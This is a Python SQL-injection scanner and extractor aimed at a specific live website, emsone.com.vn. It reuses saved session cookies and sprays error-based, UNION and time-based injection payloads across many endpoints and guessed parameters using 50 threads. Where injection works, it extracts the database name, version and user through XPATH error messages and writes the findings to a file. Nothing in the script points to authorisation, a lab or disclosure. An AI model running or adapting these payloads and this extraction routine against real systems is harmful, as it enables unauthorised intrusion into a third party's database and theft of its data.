#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class TestAllEndpointsSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.vulnerable = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_endpoint_sqli(self, endpoint, param='id'):
        """测试端点SQL注入"""
        payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--",
            "1' UNION SELECT 'TEST'--",
            "1' AND SLEEP(5)--",
        ]
        
        for payload in payloads:
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
                
                has_test = 'TEST' in r.text
                has_xpath = 'XPATH' in r.text.upper()
                has_delay = elapsed > 4
                len_diff = len(r.text)
                
                if has_test or has_xpath or has_delay:
                    result = {
                        'endpoint': endpoint,
                        'param': param,
                        'payload': payload,
                        'status': r.status_code,
                        'len': len_diff,
                        'has_test': has_test,
                        'has_xpath': has_xpath,
                        'has_delay': has_delay,
                        'elapsed': elapsed
                    }
                    
                    if has_xpath:
                        match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                        if match:
                            result['extracted'] = match.group(1)
                    
                    return result
            except:
                pass
        
        return None
    
    def test_all_params(self, endpoint):
        """测试所有参数"""
        params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 
                 'customer_id', 'customerID', 'q', 'query', 'search',
                 'keyword', 'name', 'email', 'mobile', 'phone',
                 'MobileNumber', 'Email', 'Password', 'Type',
                 'DistrictID', 'ProvinceID', 'WareHouseID', 'GroupPermissionID',
                 'username', 'user', 'uid', 'page', 'limit', 'offset']
        
        for param in params:
            result = self.test_endpoint_sqli(endpoint, param)
            if result:
                return result
        
        return None
    
    def extract_database(self, endpoint, param):
        """提取数据库"""
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
        ]
        
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            
            try:
                r = self.session.get(url, timeout=10)
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    value = match.group(1)
                    if value and value != 'TEST':
                        self.db_info[label] = value
                        return value
            except:
                pass
        
        return None
    
    def run_all(self):
        """测试所有端点"""
        print("="*60)
        print("测试所有端点SQL注入")
        print("="*60)
        
        # 加载端点
        try:
            with open('all_extracted_endpoints.json', 'r') as f:
                data = json.load(f)
                endpoints = data.get('endpoints', [])
        except:
            endpoints = []
        
        if not endpoints:
            print("[!] 未找到端点列表，先运行 extract_all_js_endpoints.py")
            return
        
        print(f"\n[*] 测试 {len(endpoints)} 个端点...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.test_all_params, endpoint): endpoint for endpoint in endpoints}
            
            for future in as_completed(futures):
                endpoint = futures[future]
                try:
                    result = future.result()
                    if result:
                        print(f"    [!] {result['endpoint']} [{result['param']}] - XPATH: {result['has_xpath']}, 延迟: {result['has_delay']}")
                        self.vulnerable.append(result)
                        
                        if result.get('has_xpath'):
                            self.extract_database(result['endpoint'], result['param'])
                except:
                    pass
        
        # 保存结果
        with open('all_endpoints_sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'vulnerable': self.vulnerable,
                'db_info': self.db_info,
                'total_tested': len(endpoints),
                'total_vulnerable': len(self.vulnerable)
            }, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 测试完成: {len(endpoints)} 个端点")
        print(f"[+] 发现漏洞: {len(self.vulnerable)} 个")
        if self.db_info:
            print(f"[+] 数据库信息: {len(self.db_info)} 项")
            for k, v in self.db_info.items():
                print(f"    {k}: {v}")

if __name__ == "__main__":
    tester = TestAllEndpointsSQLi()
    tester.run_all()